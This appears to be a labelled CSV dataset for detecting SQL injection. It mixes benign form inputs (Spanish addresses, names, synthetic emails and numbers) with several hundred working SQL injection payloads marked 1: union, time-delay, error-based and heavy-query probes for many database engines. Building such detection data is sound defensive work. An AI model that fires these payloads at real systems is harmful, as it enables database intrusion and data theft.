Query,Label
1%'))) or sleep(5)#,1
39100,0
calle tras do colexio s/n,0
"1"") and (select * from (select(sleep(5)))fzno) and (""zvew"" like ""zvew",1
unwin@hacia.gr,0
-2165' where 6593=6593 or 9158=7254--,1
vigoda5@fotoseroticas.com.ae,0
possamay@maxtienda.nu,0
1') and 8404=8651#,1
vetrie,0
jaye,0
"-7258"") as wjjr where 2110=2110 union all select 2110,2110,2110,2110,2110,2110,2110,2110,2110--",1
sobradillo,0
21236992b,0
"-4222') union all select 9267,9267,9267,9267,9267,9267--",1
96378295s,0
"1,(select 6825 from(select count(*),concat(0x7171706a71,(select (elt(6825=6825,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",1
valencia del mombuey,0
bricat,0
1)) and (4169=9887)*9887 and ((1137=1137,1
calle dos reis 49,0
7771108702507095,0
canje,0
"-3130) union all select 1741,1741,1741,1741,1741,1741,1741,1741#",1
"-9440"" union all select 5599,5599,5599,5599,5599--",1
1'))) waitfor delay '0:0:5' and ((('wvzb'='wvzb,1
12232,0
paucides,0
puchanan-gorin@fulanitoymenganito.lv,0
86704903d,0
"1)) as juoe where 9994=9994 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
spinnell@cpanelweb.com.ao,0
neene,0
0390750196070955,0
pierre-y,0
"-5617) where 2132=2132 union all select 2132,2132,2132,2132#",1
3625,0
-7624') or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ('iwab'='iwab,1
"1)) as potk where 5040=5040 or elt(5873=5873,sleep(5))#",1
escartivana,0
-8224') where 6504=6504 or 2461=5660,1
"1"") or elt(6272=6272,sleep(5)) and (""dplf"" like ""dplf",1
1) as fnpq where 5209=5209;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,1
1) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (1073=1073,1
josy,0
9ara,0
conmover,0
yasm,0
gassol,0
sikander,0
19325,0
"-9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--",1
navaescurial,0
"1)));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (((9348=9348",1
buisn andres,0
baggott@lamola-hotel.name,0
funderbu,0
garladora,0
1)) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((6406=6406,1
1) as ratg where 3033=3033 union all select null--,1
11640,0
"calle paloma 101,",0
ftpsites,0
1');waitfor delay '0:0:5' and ('yauq'='yauq,1
darbie,0
0338196248842458,0
1519,0
4162370064639312,0
3orc75r,0
1980,0
5449723667500613,0
neciamente,0
lynnell,0
c/ emile robin 194 9?h,0
"1'+(select 'kqnj' where 9483=9483 or elt(5873=5873,sleep(5))#",1
9224,0
tr?abal,0
espaldilla,0
24206,0
"-5161%"" or (1437=4869)*4869 and ""%""=""",1
"1) where 6788=6788 union all select null,null,null,null,null,null,null,null,null--",1
sanchopancesco,0
1;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,1
8996,0
tr2cad4,0
pimentel gatius,0
"aaiun, 122 12?f",0
"-1059"") union all select 1276,1276,1276,1276,1276,1276,1276,1276#",1
8267431025409914,0
"1%') and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
"1)) union all select null,null,null#",1
"-1303' union all select 4840,4840#",1
731a*n8,0
"calle pianista berdion, s/n, 13?g",0
80u90i9,0
"pasaje santo angel, 190,",0
15911,0
1%'));select (case when (3444=8424) then 3444 else 3444*(select 3444 from information_schema.character_sets) end)#,1
"1'))) union all select null,null,null,null,null,null,null,null,null,null--",1
g3a254,0
1)) as wrhe where 6120=6120 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,1
"1')) as jxvv where 6593=6593 or elt(6272=6272,sleep(5))--",1
"-8042) as zhoq where 2120=2120 union all select 2120,2120,2120,2120,2120,2120,2120,2120,2120,2120--",1
5980859147106836,0
boca de hurgano,0
50604841b,0
"1%') and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
carron,0
"-8209) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
carmnea,0
"-8205' or elt(6581=3480,3480) and 'sosv'='sosv",1
"1;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)-- rucf",1
"1' where 8360=8360 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",1
0,0
"1%');select count(*) from generate_series(1,5000000)--",1
"1'));select count(*) from generate_series(1,5000000) and (('wmoo' like 'wmoo",1
fuente el saz de jarama,0
"avda. de la costa 151,",0
longstaff elecciones,0
"1))) union all select null,null#",1
58464i8ab4e,0
winnipeg,0
"1"")) or 6793=(select 6793 from pg_sleep(5)) and ((""ejpw""=""ejpw",1
1 or (select * from (select(sleep(5)))ydpu)# lwfs,1
plinto,0
"-6200' where 9150=9150 union all select 9150,9150,9150,9150,9150,9150,9150#",1
"1') where 7252=7252;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1
"1 where 7362=7362 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"1"" and 8407=(select count(*) from generate_series(1,5000000))",1
09560,0
1')) as wjfj where 3802=3802;if(8574=7534) select 8574 else drop function nxbe--,1
"1""));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((""wueo""=""wueo",1
09763,0
1' in boolean mode) waitfor delay '0:0:5'#,1
junette6,0
c/ francia-urb.s.nicolas 171,0
estable,0
gueslaz,0
franza,0
"1"") and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (""rfpq""=""rfpq",1
1%';select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1
suti8me9te,0
suray,0
port,0
b6ar1261,0
60516960g,0
3641,0
jacarandina,0
"c/ les parres, 168",0
2781714156257998,0
tijerin monaghan,0
m9ncilla57,0
"1"")) or (select * from (select(sleep(5)))ydpu) and ((""imlq"" like ""imlq",1
"1"")) as hdyn where 6027=6027 union all select null,null,null--",1
granach@mccomptables.be,0
1'+(select 'wsjk' where 3291=3291;select (case when (9816=1693) then 9816 else cast(1 as int)/(select 0 from dual) end) from dual--,1
consell,0
albets vilar,0
wei-tsig8,0
"-6041')) or make_set(9835=1367,1367) and (('hxjf'='hxjf",1
"1"" where 9083=9083 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",1
44314,0
andoain,0
1')));select sleep(5) and ((('thqr' like 'thqr,1
"1')) as jmnw where 6496=6496 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
05357,0
3880938788805170,0
broun_granlund@purplemoongrn.fi,0
"1'||(select 'kfyh' where 4737=4737 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x))||'",1
"1""));iif(5257=5257,1,1/0)",1
"1"") as esks where 1138=1138;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
champ,0
1) where 8616=8616 and 2006=2006,1
98918059g,0
1))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((8023=8023,1
zoratti,0
leroy,0
porfidio,0
"1"")) as vxkn where 2443=2443 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
"1' in boolean mode) and make_set(7804=3315,3315)#",1
1'+(select bgbq where 1589=1589 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))+',1
31788831w,0
1'))) order by 1--,1
3549,0
vopalens,0
"1"") as drrx where 8633=8633 union all select null,null,null--",1
roana,0
"1')) as qwdh where 7581=7581 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
11639,0
cervera brcena,0
"-7749"" or (2689=7481)*7481",1
armijo,0
molledo basagaa,0
castellnou de bages,0
1'+(select 'gtqr' where 5660=5660;select pg_sleep(5)--,1
"-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#",1
hamzeh,0
kaufherr.gargoet@santacruzdelvoto.sh,0
linero-noro@cocheacoche.uy,0
mallku,0
cele959n3s0o,0
stephany,0
"1%"")) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((""%""=""",1
"1') procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)",1
giorgi,0
"1%"";select pg_sleep(5) and ""%""=""",1
"1) as cfnz where 6065=6065 union all select null,null,null,null,null,null,null,null,null#",1
"1'))) and elt(9501=8427,8427) and ((('ahpp'='ahpp",1
"-6220' union all select 1462,1462#",1
8527,0
19192,0
castroverde,0
"calle regina 18,",0
cenobia,0
descapotar,0
"1""))) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
hemisfero,0
-5861') or 1581=2611 and ('mvjh' like 'mvjh,1
"1)));select count(*) from generate_series(1,5000000)--",1
decidir,0
36384,0
carlo_salcedo4@nomao.wf,0
"1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('tkcy' like 'tkcy",1
calle corinto 108,0
"1"")) as bbkl where 5686=5686;select benchmark(5000000,md5(0x4c4d6142))--",1
"-1083') union all select 9993,9993,9993,9993,9993,9993,9993,9993,9993--",1
"1) where 3738=3738 or 8421=(select count(*) from generate_series(1,5000000))--",1
00916150z,0
elliott,0
7647479172246248,0
"1%"" union all select null,null,null,null--",1
andratx,0
tordelrbano,0
1%';select sleep(5)#,1
"1%"" rlike (select * from (select(sleep(5)))sgvo) and ""%""=""",1
san miguel del pino,0
-2039') or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),1
"1'||(select 'rdqv' from dual where 1894=1894;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)||'",1
reggis,0
"1)));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (((1105=1105",1
elia6,0
"c/ francisco santos, 96",0
kappeler-flick@probandoo.mobi,0
64079837c,0
"plaa mig de can clos, 122",0
painter.stovin@tetdevelocidad.bn,0
"-1451%') union all select 7666,7666,7666#",1
stephen,0
46838,0
braden,0
-7548 or 2850=9666,1
03770036z,0
sant jaume de frontany,0
dec4mas8xt6,0
d9a32ado,0
"1)));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (((7946=7946",1
1' rlike (select (case when (7689=7689) then 1 else 0x28 end)) and 'hyun' like 'hyun,1
2252,0
benalmdena,0
olivares,0
"el provencio, 6 8f",0
grea,0
rosina,0
"1') and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)",1
"1') where 3331=3331 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
1) as hggi where 6511=6511;select (case when (1434=1549) then 1434 else 1434*(select 1434 from mysql.db) end)#,1
julin,0
1')) as dqdv where 8126=8126 and 4595=4595#,1
macilento,0
94505880f,0
"1'))) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
1'+(select hett where 7228=7228;waitfor delay '0:0:5')+',1
kwangchi,0
1%'))) or (select * from (select(sleep(5)))ydpu) and ((('%'=',1
"1%"";select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1
1')) as dcen where 5852=5852 or (select * from (select(sleep(5)))ydpu)--,1
"-3445 union all select 5505,5505,5505--",1
"1) where 7425=7425 union all select null,null,null,null,null,null,null,null,null,null--",1
cochambroso,0
23611,0
e50land5cer,0
"1')));select benchmark(5000000,md5(0x4c4d6142)) and ((('lijy'='lijy",1
1 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))# yoch,1
"1' or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'drui' like 'drui",1
25109956m,0
vilaller,0
"moraira 185,",0
"1%"")));select (case when (3855=3855) then 3855 else 1/(select 0) end)--",1
puerto de bjar,0
suto8i+a,0
lovas@djbroadcast.bn,0
"1%""))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""%""=""",1
zubicueta vallb,0
"1%"") or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
jeshua,0
avellano,0
"c/ el cedro s/n, 2-c",0
8259767534834623,0
justis8,0
"1) as zelk where 1944=1944 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
1');begin dbms_lock.sleep(5); end,1
prestamente,0
5118232940986144,0
"1));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((6977=6977",1
entrar,0
"calle finlandia, 46, 6-a",0
"1"") as saqy where 9704=9704 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",1
"-8491"" where 9043=9043 union all select 9043,9043,9043,9043,9043,9043,9043,9043,9043--",1
"1"" and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""aixs""=""aixs",1
castelldefels 147,0
"isabelita ruiz, 31",0
0383494662597592,0
barrena,0
maldonado cubillos,0
1');(select * from (select(sleep(5)))acdk)#,1
22215,0
"1'));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('tpih'='tpih",1
delf,0
1 where 7452=7452 or 4240=(select 4240 from pg_sleep(5))--,1
"-1170' union all select 4663,4663,4663,4663,4663,4663,4663,4663#",1
-6755) or 9323=9323#,1
espejo jauregui,0
"-4176'+(select 'muio' where 4256=4256 union all select 4256,4256,4256,4256,4256,4256#",1
-7452' or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and 'nmdq' like 'nmdq,1
"1')) union all select null,null,null,null,null#",1
1464,0
1990568850978005,0
1') where 4364=4364 and 8594=(select 8594 from pg_sleep(5))--,1
"1%')) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (('%'='",1
45738,0
rasquetear,0
1') where 6624=6624 and 5392=8258,1
"-1947 union all select 7780,7780,7780,7780,7780,7780,7780,7780#",1
"1')) as mxxd where 7255=7255 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
1') where 9175=9175;select case when 7634=3954 then 1 else null end--,1
"1;call regexp_substring(repeat(right(char(3702),0),500000000),null)# huhw",1
maestre camprubi,0
9568195762432395,0
mellvig@docerosas.sd,0
36574,0
08261,0
"1';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
lyston@classroommanager.co,0
"-6754') where 8388=8388 union all select 8388,8388,8388,8388,8388--",1
"1'||(select 'adni' from dual where 6611=6611;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual)||'",1
muras,0
rhonda,0
"1%"") and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
valle de mena,0
"1)) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((4048=4048",1
nieva de cameros,0
ducaux@muchachina.tk,0
1) where 7096=7096;begin user_lock.sleep(5); end--,1
8357,0
"-9379) or make_set(9354=9354,7185) and (9212=9212",1
curi piccech,0
fulivio,0
"-5972"" or 8509=3448#",1
"-9152"")) as avga where 3825=3825 order by 1#",1
bettine,0
